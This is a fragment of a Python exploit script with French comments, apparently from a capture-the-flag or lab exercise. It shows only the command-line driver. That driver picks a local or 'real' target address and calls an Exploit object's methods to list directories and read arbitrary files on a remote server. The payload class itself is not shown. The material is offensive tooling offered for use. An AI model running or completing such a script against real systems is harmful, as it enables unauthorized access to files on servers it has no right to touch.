            print("RECV %r" % data.rstrip(b'\0'))


def main():
    parser = argparse.ArgumentParser(description="Exploite un serveur")
    parser.add_argument('-i', '--ip', type=str)
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('--real', action='store_true')
    parser.add_argument('-l', '--ls', type=str)
    parser.add_argument('-r', '--read', type=str)
    args = parser.parse_args()

    # Détermine l'adresse IP et le port à utiliser en fonction des arguments
    tcpip_addr = LOCAL_ADDR
    if args.real:
        tcpip_addr = REAL_ADDR
    if args.ip:
        tcpip_addr = (args.ip, tcpip_addr[1])
    if args.port:
        tcpip_addr = (tcpip_addr[0], args.port)

    # Exécute le code
    e = Exploit(tcpip_addr)
    if args.ls:
        e.ls(args.ls)
    elif args.read:
        e.read(args.read)
    return e


if __name__ == '__main__':
    main()
